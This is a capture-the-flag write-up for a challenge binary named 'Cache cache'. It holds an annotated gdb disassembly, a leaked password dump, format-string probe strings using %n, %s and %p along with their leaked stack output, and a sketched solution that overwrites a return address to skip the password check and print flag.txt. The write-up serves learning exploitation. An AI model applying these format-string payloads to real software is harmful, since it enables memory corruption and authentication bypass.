# Cache cache

<img src="cache_cache.png" alt="cache_cache" width="400"/>

## (gdb) disas main
```
Dump of assembler code for function main:
   0x000000000040174b <+0>:     push   %rbp
   0x000000000040174c <+1>:     mov    %rsp,%rbp
   0x000000000040174f <+4>:     sub    $0x140,%rsp
   0x0000000000401756 <+11>:    mov    %edi,-0x134(%rbp)
   0x000000000040175c <+17>:    mov    %rsi,-0x140(%rbp)
   0x0000000000401763 <+24>:    mov    %fs:0x28,%rax
   0x000000000040176c <+33>:    mov    %rax,-0x8(%rbp)
   0x0000000000401770 <+37>:    xor    %eax,%eax
   0x0000000000401772 <+39>:    mov    0xc1017(%rip),%rax        # 0x4c2790 <stdout>
   0x0000000000401779 <+46>:    mov    $0x0,%ecx
   0x000000000040177e <+51>:    mov    $0x2,%edx
   0x0000000000401783 <+56>:    mov    $0x0,%esi
   0x0000000000401788 <+61>:    mov    %rax,%rdi
   0x000000000040178b <+64>:    callq  0x410de0 <setvbuf>
   0x0000000000401790 <+69>:    movl   $0x14,-0x128(%rbp)
   0x000000000040179a <+79>:    movb   $0x61,-0x12a(%rbp)
   0x00000000004017a1 <+86>:    lea    0x93860(%rip),%rax        # 0x495008
   0x00000000004017a8 <+93>:    mov    %rax,-0x110(%rbp)
   0x00000000004017af <+100>:   lea    0x9385d(%rip),%rax        # 0x495013
   0x00000000004017b6 <+107>:   mov    %rax,-0x108(%rbp)
   0x00000000004017bd <+114>:   lea    0x9386a(%rip),%rax        # 0x49502e
   0x00000000004017c4 <+121>:   mov    %rax,-0x100(%rbp)
   0x00000000004017cb <+128>:   lea    0x93877(%rip),%rax        # 0x495049
   0x00000000004017d2 <+135>:   mov    %rax,-0xf8(%rbp)
   0x00000000004017d9 <+142>:   movq   $0x4,-0x120(%rbp)
   0x00000000004017e4 <+153>:   mov    $0x0,%edi
   0x00000000004017e9 <+158>:   callq  0x452730 <time>									TIME
   0x00000000004017ee <+163>:   mov    %eax,%edi
   0x00000000004017f0 <+165>:   callq  0x4096f0 <srandom>								SRAND
   0x00000000004017f5 <+170>:   jmp    0x40184f <main+260>								MAIN+260
   0x00000000004017f7 <+172>:   mov    -0x120(%rbp),%rax
   0x00000000004017fe <+179>:   sub    $0x1,%eax
   0x0000000000401801 <+182>:   mov    %eax,%edi
   0x0000000000401803 <+184>:   callq  0x4016e5 <rand_lim>								RAND_LIM
   0x0000000000401808 <+189>:   mov    %eax,-0x124(%rbp)
   0x000000000040180e <+195>:   mov    -0x124(%rbp),%eax
   0x0000000000401814 <+201>:   mov    -0x110(%rbp,%rax,8),%rax
   0x000000000040181c <+209>:   mov    %rax,%rdi
   0x000000000040181f <+212>:   callq  0x40171a <picker>								PICKER x 20 == password generation
   0x0000000000401824 <+217>:   mov    %al,-0x12a(%rbp)
   0x000000000040182a <+223>:   lea    -0x12a(%rbp),%rcx
   0x0000000000401831 <+230>:   lea    -0xf0(%rbp),%rax
   0x0000000000401838 <+237>:   mov    $0x1,%edx
   0x000000000040183d <+242>:   mov    %rcx,%rsi
   0x0000000000401840 <+245>:   mov    %rax,%rdi
   0x0000000000401843 <+248>:   callq  0x401068
   0x0000000000401848 <+253>:   subl   $0x1,-0x128(%rbp)
   0x000000000040184f <+260>:   cmpl   $0x0,-0x128(%rbp)
   0x0000000000401856 <+267>:   jne    0x4017f7 <main+172>								MAIN+172
   0x0000000000401858 <+269>:   lea    0x93801(%rip),%rax        # 0x495060
   0x000000000040185f <+276>:   mov    %rax,%rdi
   0x0000000000401862 <+279>:   callq  0x410c40 <puts>									PUTS "Veuillez décliner votre identité:"
   0x0000000000401867 <+284>:   mov    0xc0f2a(%rip),%rdx        # 0x4c2798 <stdin>
   0x000000000040186e <+291>:   lea    -0x80(%rbp),%rax
   0x0000000000401872 <+295>:   mov    $0x78,%esi
   0x0000000000401877 <+300>:   mov    %rax,%rdi
   0x000000000040187a <+303>:   callq  0x410680 <fgets>									FGETS username
   0x000000000040187f <+308>:   lea    0x937fe(%rip),%rax        # 0x495084
   0x0000000000401886 <+315>:   mov    %rax,%rdi
   0x0000000000401889 <+318>:   mov    $0x0,%eax
   0x000000000040188e <+323>:   callq  0x40a4d0 <printf>								PRINTF
   0x0000000000401893 <+328>:   lea    -0x80(%rbp),%rax
   0x0000000000401897 <+332>:   mov    %rax,%rdi
   0x000000000040189a <+335>:   mov    $0x0,%eax
   0x000000000040189f <+340>:   callq  0x40a4d0 <printf>								PRINTF
   0x00000000004018a4 <+345>:   lea    0x937e2(%rip),%rax        # 0x49508d
   0x00000000004018ab <+352>:   mov    %rax,%rdi
   0x00000000004018ae <+355>:   callq  0x410c40 <puts>									PUTS "Quel est votre mot de passe?"
   0x00000000004018b3 <+360>:   mov    0xc0ede(%rip),%rdx        # 0x4c2798 <stdin>
   0x00000000004018ba <+367>:   lea    -0xd0(%rbp),%rax
   0x00000000004018c1 <+374>:   mov    $0x15,%esi
   0x00000000004018c6 <+379>:   mov    %rax,%rdi
   0x00000000004018c9 <+382>:   callq  0x410680 <fgets>									FGETS password
   0x00000000004018ce <+387>:   lea    -0xd0(%rbp),%rax
   0x00000000004018d5 <+394>:   lea    0x937cf(%rip),%rdx        # 0x4950ab
   0x00000000004018dc <+401>:   mov    %rdx,%rsi
   0x00000000004018df <+404>:   mov    %rax,%rdi
   0x00000000004018e2 <+407>:   callq  0x401098
   0x00000000004018e7 <+412>:   movb   $0x0,-0xd0(%rbp,%rax,1)
   0x00000000004018ef <+420>:   lea    0x937ba(%rip),%rax        # 0x4950b0
   0x00000000004018f6 <+427>:   mov    %rax,%rdi
   0x00000000004018f9 <+430>:   callq  0x410c40 <puts>									PUTS "Vérification du mot de passe en cours ..."
   0x00000000004018fe <+435>:   lea    -0xd0(%rbp),%rdx
   0x0000000000401905 <+442>:   lea    -0xf0(%rbp),%rax
   0x000000000040190c <+449>:   mov    %rdx,%rsi
   0x000000000040190f <+452>:   mov    %rax,%rdi
   0x0000000000401912 <+455>:   callq  0x401080
   0x0000000000401917 <+460>:   test   %eax,%eax
   0x0000000000401919 <+462>:   sete   %al
   0x000000000040191c <+465>:   mov    %al,-0x129(%rbp)
   0x0000000000401922 <+471>:   cmpb   $0x0,-0x129(%rbp)
   0x0000000000401929 <+478>:   je     0x4019a4 <main+601>								MAIN+601
   0x000000000040192b <+480>:   lea    0x937ae(%rip),%rax        # 0x4950e0
   0x0000000000401932 <+487>:   mov    %rax,%rdi
   0x0000000000401935 <+490>:   callq  0x410c40 <puts>									PUTS "Bonjour Monsieur Dupont. Comme toujours, nous sommes heureux de faire affaire avec vous."
   0x000000000040193a <+495>:   lea    0x937ff(%rip),%rax        # 0x495140
   0x0000000000401941 <+502>:   mov    %rax,%rdi
   0x0000000000401944 <+505>:   callq  0x410c40 <puts>									PUTS "Vous avez plusieurs paiements en attente à récupérer. Veuillez nous transmettre votre adresse ethereum de la manière prévue auparavant.\n"
   0x0000000000401949 <+510>:   lea    0x9387e(%rip),%rax        # 0x4951ce
   0x0000000000401950 <+517>:   mov    %rax,%rsi
   0x0000000000401953 <+520>:   lea    0x93877(%rip),%rax        # 0x4951d1
   0x000000000040195a <+527>:   mov    %rax,%rdi
   0x000000000040195d <+530>:   callq  0x410930 <fopen64>								FOPEN flag.txt
   0x0000000000401962 <+535>:   mov    %rax,-0x118(%rbp)
   0x0000000000401969 <+542>:   mov    -0x118(%rbp),%rdx
   0x0000000000401970 <+549>:   lea    -0xb0(%rbp),%rax
   0x0000000000401977 <+556>:   mov    $0x28,%esi
   0x000000000040197c <+561>:   mov    %rax,%rdi
   0x000000000040197f <+564>:   callq  0x410680 <fgets>									FGETS (from file ?)
   0x0000000000401984 <+569>:   lea    -0xb0(%rbp),%rax
   0x000000000040198b <+576>:   mov    %rax,%rdi
   0x000000000040198e <+579>:   callq  0x410c40 <puts>									PUTS file content
   0x0000000000401993 <+584>:   mov    -0x118(%rbp),%rax
   0x000000000040199a <+591>:   mov    %rax,%rdi
   0x000000000040199d <+594>:   callq  0x410390 <fclose>								FCLOSE
   0x00000000004019a2 <+599>:   jmp    0x4019b3 <main+616>								MAIN+616
   0x00000000004019a4 <+601>:   lea    0x93835(%rip),%rax        # 0x4951e0
   0x00000000004019ab <+608>:   mov    %rax,%rdi
   0x00000000004019ae <+611>:   callq  0x410c40 <puts>									PUTS "wrong pass"
   0x00000000004019b3 <+616>:   mov    $0x0,%eax
   0x00000000004019b8 <+621>:   mov    -0x8(%rbp),%rdx
   0x00000000004019bc <+625>:   sub    %fs:0x28,%rdx
   0x00000000004019c5 <+634>:   je     0x4019cc <main+641>    							MAIN+641
   0x00000000004019c7 <+636>:   callq  0x455a80 <__stack_chk_fail_local>
   0x00000000004019cc <+641>:   leaveq
   0x00000000004019cd <+642>:   retq
End of assembler dump.
```

## password leak
```
(gdb) x /s $rbp - 0xf0
0x7fffffffdd90: "6.2u4.(v3IX.(8Hr$YwJ"
(gdb) x /s $rbp - 0xd0
0x7fffffffddb0: 'a' <repeats 20 times>
```

## format string
```
Veuillez décliner votre identité:
AAAA%n %s %s %s %n %n %x %x %x %x %s %s %s %s %s %x %x %x %x %x %s %s %s %x %x %n %s %n %x %x %x %x %x %x %x %x %x %x %x    
Bonjour  (null) H= (null)   41cb7e 4cb450 0 4 (null) 1234567890 abcdefghijklmnoqprstuvwyzx ABCDEFGHIJKLMNOPQRSTUYWVZX !@#$%^&*(){}[]:<>?,./ 70693137 6b594b41 765e5d70 2 b (null) (null) (null) 7c 6e  (null)  9 41414141 %

%p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p
Bonjour 0x7ffe70b8d3d0 (nil) 0x4532c7 (nil) 0x4c2880 0x7ffe70b8f808 0x10041cb7e 0x610000004cb450 0x100000000 0x4 (nil) 0x495008 0x495013 0x49502e 0x495049 0x2471254a754e3630 0x2f24467736385a5a 0x61755230 0x2 0x320000000b (nil) (nil) (nil) 0x770000007c 0x5b0000006e 0x4c2880 (nil) 0x4c2880 0x9 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520
```

### good pass
```
Breakpoint 5, 0x0000000000401919 in main ()
(gdb) x $al
0x0:    <error: Cannot access memory at address 0x0>
(gdb) si
Breakpoint 4, 0x000000000040191c in main ()
(gdb) x $al
0x1:    <error: Cannot access memory at address 0x1>
(gdb) x /d $rbp - 0x129
0x7fffffffdd57: 0
(gdb) x $al
0x1:    <error: Cannot access memory at address 0x1>
(gdb) si
0x0000000000401922 in main ()
(gdb) x /d $rbp - 0x129
0x7fffffffdd57: 1
```
### wrong pass
```
Breakpoint 5, 0x0000000000401919 in main ()
(gdb) x $al
0xffffffffffffffd6:     <error: Cannot access memory at address 0xffffffffffffffd6> 		-> ctrcmp return value ?
(gdb) si
Breakpoint 4, 0x000000000040191c in main ()
(gdb) x $al
0x0:    <error: Cannot access memory at address 0x0>
(gdb) x /d $rbp - 0x129
0x7fffffffdd57: 0
(gdb) x $al
0x0:    <error: Cannot access memory at address 0x0>
(gdb) si
0x0000000000401922 in main ()
(gdb) x /d $rbp - 0x129
0x7fffffffdd57: 0
```

##########################################


## Solution : 

avec `%[NNNN]s %[stackoffset]$n \xAA\xBB\xCC\xDD\x00\x00\x00\x00\x00`, 
on peut remplacer l'adresse DDCCBBAA par une autre adresse, un peu plus loin dans main (apres strcmp)

difficulté: on doit placer l'adresse a ecrire en dernier vu qu'elle termine par des zeros...

Pour cela, on incrémente juste la valeur du %s de 1 ou plus afin de sauter une adresse (ou plus) plus loin, avec un peu de padding (\x42)